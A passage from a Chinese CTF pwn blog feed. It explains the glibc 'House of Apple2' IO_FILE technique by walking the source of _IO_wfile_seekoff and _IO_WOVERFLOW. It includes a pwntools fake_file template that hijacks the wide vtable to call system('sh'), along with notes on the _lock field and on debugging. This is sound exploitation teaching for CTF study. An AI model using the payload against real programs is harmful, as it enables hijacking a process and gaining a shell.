*_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以发现他和<code>_IO_FILE</code>结构体很像，其实作用几乎是相同的。我们来看为什么我们需要劫持这个成员，首先来看<code>_IO_wfile_jumps</code>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>根据前面分析，我们会执行<code>_IO_wfile_seekoff</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Short-circuit into a separate function.  We don&#x27;t want to mix any</span></span><br><span class="line"><span class="comment">     functionality and we don&#x27;t want to touch anything inside the FILE</span></span><br><span class="line"><span class="comment">     object. */</span></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POSIX.1 8.2.3.7 says that after a call the fflush() the file</span></span><br><span class="line"><span class="comment">     offset of the underlying file must be exact.  */</span></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">      || _IO_in_put_mode (fp));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush unwritten characters.</span></span><br><span class="line"><span class="comment">     (This may do an unneeded write if we seek within the buffer.</span></span><br><span class="line"><span class="comment">     But to be able to switch to reading, we would need to set</span></span><br><span class="line"><span class="comment">     egptr to pptr.  That can&#x27;t be done in the current design,</span></span><br><span class="line"><span class="comment">     which assumes file_ptr() is eGptr.  Anyway, since we probably</span></span><br><span class="line"><span class="comment">     end up flushing when we close(), it doesn&#x27;t make much difference.)</span></span><br><span class="line"><span class="comment">     <span class="doctag">FIXME:</span> simulate mem-mapped files. */</span></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    </span><br><span class="line">...(这个函数很长很长)</span><br></pre></td></tr></table></figure><p>fp指向当前FILE（例如puts函数对应stdout）。显然这个函数的条件判断等等都用的是指向wide_data中的成员来操作，所以我们需要将<code>_wide_data</code>指向一个可控地址来伪造条件才能进入我们想要进入的调用链。</p><h5 id="伪造条件进入调用链"><a href="#伪造条件进入调用链" class="headerlink" title="伪造条件进入调用链"></a>伪造条件进入调用链</h5><p>我们需要从seekoff函数进入到<code>_IO_switch_to_wget_mode</code>中，从上面的代码不难看出，我们想执行到这个函数，首先需要满足<code>was_writing</code>为真，即满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>。这就需要在<code>_wide_data</code>对应的可控地址中进行修改。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span>      &lt;--改小</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span>    &lt;--改大</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span>  &lt;--下面还会修改这个指针为可控地址</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再来关注<code>_IO_switch_to_wget_mode</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>时，会执行到<code>_IO_WOVERFLOW</code>函数，刚刚已经构造好了，所以不用再修改其他东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">       + offsetof(TYPE, MEMBER)))</span></span><br></pre></td></tr></table></figure><p>它会通过宏展开调用到<code>_wide_vtable</code>指向的虚表中的<code>__overflow</code>指向的函数。而这个虚表没有检查，所以可以将<code>__overflow</code>指针改成ogg或者system函数，通过上述调用链，就能拿到shell了。想要修改函数指针，我们就需要将<code>_wide_vtable</code>指针成员改为可控地址，并在对应偏移处写上你想要劫持的函数即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> __overflow (FILE *, <span class="type">int</span>);</span><br></pre></td></tr></table></figure><p>根据函数原型可知函数的第一个参数是FILE指针本身，所以如果有参数，要写在flags位上，前面要加上两个空格。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>调用链如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">puts</span></span><br><span class="line">  _IO_XSPUTN（原解析） --&gt; _IO_wfile_seekoff（现解析）</span><br><span class="line">     _IO_switch_to_wget_mode</span><br><span class="line">        _IO_WOVERFLOW</span><br><span class="line">           *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure><p>要修改的东西如下(fp代指<code>_IO_2_1_stdout_-&gt;file</code>)：</p><ul><li><code>vtable </code>改成<code>_IO_wfile_jumps+0x10</code></li><li><code>fp -&gt; _wide_data</code>改成一个可控地址，这道题里直接改成了<code>_IO_2_1_stdout_</code></li><li><code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code></li><li><code>fp -&gt; _wide_data -&gt; _wide_vtable</code>改成一个可控地址,这道题里改成了<code>_IO_2_1_stdout_-8</code></li><li><code>fp -&gt; _wide_data -&gt; _wide_vtable -&gt; overflow</code>改成ogg或system</li></ul><h4 id="板子"><a href="#板子" class="headerlink" title="板子"></a>板子</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&#x27;  sh;&#x27;</span>,</span><br><span class="line">    <span class="number">0x10</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]),</span><br><span class="line">    <span class="number">0x20</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x88</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>),  <span class="comment"># _lock</span></span><br><span class="line">    <span class="number">0xa0</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]),</span><br><span class="line">    <span class="number">0xd8</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] + <span class="number">0x10</span>),</span><br><span class="line">    <span class="number">0xe0</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]-<span class="number">8</span>),</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="关于-lock的一些思考"><a href="#关于-lock的一些思考" class="headerlink" title="关于_lock的一些思考"></a>关于_lock的一些思考</h4><p>每个师傅自己调的板子都会有些不太一样，有些师傅的wp里会给file中的<code>_lock</code>也写上一个值，有些没有，甚至每个板子写的lock地址还不一样。这个应该和题目或者是调用链有关。我想尝试从源码或者汇编中找出一些关于覆写_lock的必要性，奈何水平不够，没能分析出来个所以然，但是网上也没有多少师傅提到过这个成员，唯一能找到的说法是要给lock覆写一个可写地址。我尝试在这道题里随便写上一个堆地址，但是没能打通。下面大概讲讲我挣扎的过程，但是结论有待验证。</p><p>我们先来看看不给lock覆写值会发生什么。从脚本进行调试并且链接了源码调试。<img src="https://c-lby.top/images/2024deadsec_wp/apple2_lock%E6%97%A0%E8%A6%86%E5%86%99%E6%8A%A5%E9%94%99.png" alt="apple2_lock无覆写报错"></p><p>程序卡在一个<code>cmpxchg</code>的指令，对应的源码是和lock相关的。那个语句可以通过宏定义展开，但是我看的一头雾水，所以我选择去看看其对应的汇编语句。<img src="https://c-lby.top/images/2024deadsec_wp/IO_file_underflow.png" alt="_IO_file_underflow"></p><p>从0x8CAFB开始往下分析，首先将<code>_IO_2_1_stdout_</code>的地址赋给了r12，将flags与0x8000做与运算并根据结果选择分支；如果不满足跳转条件，则取出stdout+0x88也就是_lock处的内容赋给rdi，将fs+0x10（是一个指向tls结构体的指针）赋给了rbp，然后将<code>_lock</code>处内容+8后取出里面的内容和rbp做比较，然后分支可能就会进入到cmpxchg指令中。关于这个指令的解释网上<a href="https://coderatwork.cn/posts/linux-cmpxchg/">资料</a>有很多，简单来讲就是个比较交换的操作。</p><p>在上述这些步骤中，我们可以关注到关于这个lock至少需要满足这些要求：</p><ul><li>[_lock]可读</li><li>[_lock+8]可读</li><li>[[_lock]]可写</li></ul><p>其实也就是覆写上去的那个地址要可写。当然，这些条件不是在每个情况下都要满足，也不是在每道题都要写lock的，上述过程里是有几个条件判断分支的，所以要结合具体情况来分析到底需不需要写lock上去。</p><p>我并不确定我的分析是否正确，结论也只经过了少量验证，而且总有几率会-11报错终止程序，所以有待进一步分析。并且目前遇到了另一个奇怪的问题。_lock只被覆写了低两个字节，而高四个字节依然是libc的地址的高位（经过几次实验发现是<code>_IO_stdfile_1_lock</code>的地址高位）。如下，我写入一个堆地址，然而lock位上的地址只有两位被改变了。这个问题尚未找到原因。就这个情况而言，我们只能写一个和<code>_IO_stdfile_1_lock</code>很接近的地址才能行得通，堆地址是不行的。这样的话好像不如直接写固定偏移（0x21ca70）好了。（24.8.7）</p><p><img src="https://c-lby.top/images/2024deadsec_wp/%E5%86%99%E5%85%A5%E7%9A%84%E5%A0%86%E5%9C%B0%E5%9D%80.png" alt="写入的堆地址"></p><p>经过挣扎，又问了xf1les爷，终于找到答案了。这里用堆地址没法打通只是这道题用了gets函数来接收数据的原因。因为gets函数是逐字节读取数据的，这也就意味着地址会一个字节一个字节地写到lock上，然而写上去的过程中，gets会不断调用<code>_IO_acquire_lock(stdout)</code>，也就是从stdout这个fp中取出lock来用，而其中lock地址可能不是一个可读可写的地址，这就导致了程序会一直卡在cmpxchg这个指令上。如果是read函数，则这样的问题不会出现，堆地址是可以使用的。（24.8.10）</p><p>从另一个角度看，如果调用链和程序原本的函数没有使用到stdout的lock的话，我们甚至可以不用覆写lock。这也就是为什么有些师傅的板子里没有写lock。</p><h3 id="0x02-如何调试程序『LitCTF2024』2-35"><a href="#0x02-如何调试程序『LitCTF2024』2-35" class="headerlink" title="0x02 如何调试程序『LitCTF2024』2.35"></a>0x02 如何调试程序『LitCTF2024』2.35</h3><p>执行流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">_IO_cleanup</span><br><span class="line">_IO_flush_all_lockp</span><br><span class="line">_IO_wfile_overflow</span><br><span class="line">_IO_wdoallocbuf</span><br><span class="line">_IO_WDOALLOCATE --&gt; system</span><br></pre></td></tr></table></figure><h5 id="调试板子："><a href="#调试板子：" class="headerlink" title="调试板子："></a>调试板子：</h5><p>断点在脚本edit之后，exit之前。</p><p>查看修改后的_IO_list_all</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p/x *(struct _IO_FILE_plus *)_IO_list_all</span><br></pre></td></tr></table></figure><p><img src="D:\LBY_BLOG\LBY_BLOG\source\images\2024deadsec_wp\lit劫持后的IO_list_all.png" alt="lit劫持后的IO_list_all"></p><p>可以看到vtable已经被劫持为<code>_IO_wfile_jumps</code>了。同时也可以看到<code>_wide_data</code>也被劫持成了一个堆地址，这个堆地址是通过largebin attack写进去的。</p>]]></content>
      
      
      <categories>
          
          <category> Heap Exploitation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> heap </tag>
            
            <tag> IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『glibc源码补完计划』IO_FILE</title>
      <link href="/2024/glibc-IO/"/>
      <url>/2024/glibc-IO/</url>
      
        <content type="html"><![CDATA[<h3 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h3><h5 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h5><p><code>_IO_FILE_plus</code>定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中<code>FILE</code>的定义是<code>typedef struct _IO_FILE FILE;</code></p><h5 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h5><p>我们查看<code>_IO_FILE</code>的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_FILE</code>在满足<code>_IO_USE_OLD_IO_FILE</code>的情况下才会转变完善为<code>_IO_FILE_complete</code>。一个进程中的所有FILE结构会通过<code>_chain</code>来连接成一个单向链表，并通过<code>_IO_list_all</code>来记录链表头部。而这个变量在进程一开始是直接指向<code>_IO_2_1_stderr_</code>的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span 